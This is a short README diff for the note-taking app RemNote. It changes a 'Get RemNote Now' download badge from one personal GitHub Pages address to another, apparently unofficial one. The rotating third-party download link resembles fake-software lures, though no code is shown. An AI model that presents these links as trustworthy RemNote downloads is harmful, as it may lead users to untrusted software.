@@ -2,7 +2,7 @@
 
 > **Link your notes, generate cards from what you learn, and review on a schedule that sticks.**
 
-[![Get RemNote Now](https://img.shields.io/badge/Get_RemNote_Now-0a5d8d?style=for-the-badge&logo=github)](https://stephaniefernanda7899.github.io/.github/remnote-notes)
+[![Get RemNote Now](https://img.shields.io/badge/Get_RemNote_Now-0a5d8d?style=for-the-badge&logo=github)](https://kaiuymsarker01.github.io/.github/RemNote-Notes)
 
 ---
 
